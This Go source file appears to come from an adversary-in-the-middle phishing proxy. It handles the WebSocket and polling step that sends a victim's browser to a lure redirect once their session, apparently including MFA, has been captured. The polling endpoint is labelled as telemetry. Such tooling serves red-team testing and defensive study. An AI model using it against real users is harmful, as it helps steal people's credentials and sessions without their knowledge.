package proxy

import (
	"encoding/json"
	"log/slog"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"

	"github.com/travisbale/mirage/internal/aitm"
)

// redirectMsg is sent over WebSocket when a session completes, triggering the browser redirect.
type redirectMsg struct {
	RedirectURL string `json:"redirect_url"`
}

type eventSubscriber interface {
	Subscribe(eventType aitm.EventType) <-chan aitm.Event
}

// WSHub manages active WebSocket connections waiting for session completion.
// When EventSessionCompleted fires, the hub sends the redirect URL to all
// WebSocket connections waiting on that session ID.
type WSHub struct {
	upgrader websocket.Upgrader
	sessions sessionGetter
	mu       sync.Mutex
	waiting  map[string][]chan redirectMsg // session ID → waiting channels
	logger   *slog.Logger
}

func NewWSHub(bus eventSubscriber, sessions sessionGetter, logger *slog.Logger) *WSHub {
	hub := &WSHub{
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
		sessions: sessions,
		waiting:  make(map[string][]chan redirectMsg),
		logger:   logger,
	}

	go hub.listenCompletions(bus)

	return hub
}

func (h *WSHub) listenCompletions(bus eventSubscriber) {
	completionCh := bus.Subscribe(aitm.EventSessionCompleted)
	for event := range completionCh {
		session, ok := event.Payload.(*aitm.Session)
		if !ok {
			continue
		}

		h.mu.Lock()
		waiters := h.waiting[session.ID]
		delete(h.waiting, session.ID)
		h.mu.Unlock()

		msg := redirectMsg{RedirectURL: session.LureRedirectURL()}
		for _, waiterCh := range waiters {
			waiterCh <- msg
		}
	}
}

// HandleUpgrade handles GET /ws/{sid}: blocks until the session completes,
// then sends the redirect URL and closes the connection.
func (h *WSHub) HandleUpgrade(w http.ResponseWriter, r *http.Request, sessionID string) {
	// Register the waiter before checking session state so we cannot miss a
	// completion event that fires in the gap between the check and registration.
	resultCh := make(chan redirectMsg, 1)
	h.mu.Lock()
	h.waiting[sessionID] = append(h.waiting[sessionID], resultCh)
	h.mu.Unlock()

	// If the session is already complete (e.g. the victim's browser navigated
	// to a new page after MFA and opened a fresh WebSocket after the completion
	// event already fired), pre-fill the channel so the select below fires
	// immediately. If a concurrent completion event also sends to resultCh,
	// the default branch is taken and the event's message is used instead.
	if session, err := h.sessions.Get(sessionID); err == nil && session.IsDone() {
		select {
		case resultCh <- redirectMsg{RedirectURL: session.LureRedirectURL()}:
		default: // concurrent completion event already filled the channel
		}
	}

	conn, err := h.upgrader.Upgrade(w, r, nil)
	if err != nil {
		h.removeWaiter(sessionID, resultCh)
		h.logger.Warn("wshub: upgrade failed", "error", err)
		return
	}
	defer conn.Close()

	select {
	case msg := <-resultCh:
		if err := conn.WriteJSON(msg); err != nil {
			h.logger.Warn("wshub: write failed", "session_id", sessionID, "error", err)
		}
	case <-time.After(10 * time.Minute):
		// Session timed out — client will fall back to polling.
		h.removeWaiter(sessionID, resultCh)
		h.logger.Debug("wshub: timeout waiting for session completion", "session_id", sessionID)
	}
}

func (h *WSHub) removeWaiter(sessionID string, ch chan redirectMsg) {
	h.mu.Lock()
	defer h.mu.Unlock()
	waiters := h.waiting[sessionID]
	for i, c := range waiters {
		if c == ch {
			h.waiting[sessionID] = append(waiters[:i], waiters[i+1:]...)
			if len(h.waiting[sessionID]) == 0 {
				delete(h.waiting, sessionID)
			}
			return
		}
	}
}

type sessionGetter interface {
	Get(id string) (*aitm.Session, error)
}

// HandleTelemetryDone is the fallback polling endpoint GET /t/{sid}/done.
// Returns {"redirect_url":"..."} if the session is complete, {"done":false} otherwise.
func HandleTelemetryDone(sessions sessionGetter) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		var sessionID string
		for i := len(path) - 1; i >= 0; i-- {
			if path[i] == '/' {
				if i+1 < len(path) {
					// Check if this is the /done suffix
					if path[i:] == "/done" {
						rest := path[:i]
						for j := len(rest) - 1; j >= 0; j-- {
							if rest[j] == '/' {
								sessionID = rest[j+1:]
								break
							}
						}
					}
				}
				break
			}
		}

		w.Header().Set("Content-Type", "application/json")
		sess, err := sessions.Get(sessionID)
		if err != nil || !sess.IsDone() {
			json.NewEncoder(w).Encode(map[string]bool{"done": false})
			return
		}
		json.NewEncoder(w).Encode(redirectMsg{RedirectURL: sess.LureRedirectURL()})
	}
}
